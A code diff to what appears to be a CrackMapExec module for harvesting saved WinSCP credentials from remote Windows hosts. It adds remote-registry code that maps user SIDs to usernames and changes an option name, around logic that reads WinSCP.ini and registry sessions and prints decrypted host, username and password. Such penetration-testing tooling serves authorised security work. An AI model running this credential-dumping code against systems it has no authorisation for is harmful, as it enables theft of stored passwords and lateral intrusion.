@@ -27,18 +27,22 @@ class CMEModule:
 
     def options(self, context, module_options):
         """
-        SEARCH_PATH     Specify the search Path if you already found a WinSCP.ini file or you want to change the default Paths (you must add single quotes around the paths if they include spaces)
-                        Default: 'C:\\Users\\{u}\\AppData\\Roaming\\WinSCP.ini','C:\\Users\\{u}\\Documents\\WinSCP.ini'
+        PATH        Specify the Path if you already found a WinSCP.ini file.
+
+        As Default the script looks into the registry and searches for WinSCP.ini files in
+            \"C:\\Users\\{USERNAME}\\Documents\\WinSCP.ini\" and in
+            \"C:\\Users\\{USERNAME}\\AppData\\Roaming\\WinSCP.ini\",
+            for every user found on the System.
         """
-        if 'SEACH_PATH' in module_options:
-            self.filepath = module_options['SEACH_PATH']
+        if 'PATH' in module_options:
+            self.filepath = module_options['PATH']
         else:
             self.filepath = ""
 
         self.PW_MAGIC = 0xA3
         self.PW_FLAG  = 0xFF
         self.share = 'C$'
-
+        self.userDict = {}
 
     # ==================== Helper ====================
     def printCreds(self, context, session):
@@ -49,6 +53,24 @@ class CMEModule:
             context.log.highlight("HostName: {s}".format(s=session[1]))
             context.log.highlight("UserName: {s}".format(s=session[2]))
             context.log.highlight("Password: {s}".format(s=session[3]))
+
+    def userObjectToNameMapper(self, context, connection, allUserObjects):
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
+
+            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
+            regHandle = ans['phKey']
+
+            for userObject in allUserObjects:
+                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\' + userObject)
+                keyHandle = ans['phkResult']
+
+                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'ProfileImagePath')[1].split('\x00')[:-1][0]
+                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+                self.userDict[userObject] = userProfilePath.split('\\')[-1]
+        finally:
+            remoteOps.finish()
 
     # ==================== Decrypt Password ====================
     def decryptPasswd(self, context, host: str, username: str, password: str) -> str:
@@ -283,6 +305,7 @@ class CMEModule:
             # Enumerate all Users on System
             userObjects = self.findAllLoggedInUsersInRegistry(context, connection)
             allUserObjects = self.findAllUsers(context, connection)
+            self.userObjectToNameMapper(context, connection, allUserObjects)
 
             # Users which must be loaded into registry:
             unloadedUserObjects = list(set(userObjects).symmetric_difference(set(allUserObjects)))
@@ -298,7 +321,7 @@ class CMEModule:
 
                     data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
                     sessions = data['lpcSubKeys']
-                    context.log.success("Found {} sessions for userObject {} in registry!".format(sessions - 1, userObject))
+                    context.log.success("Found {} sessions for user \"{}\" in registry!".format(sessions - 1, self.userDict[userObject]))
                     
                     
                     # Get Session Names
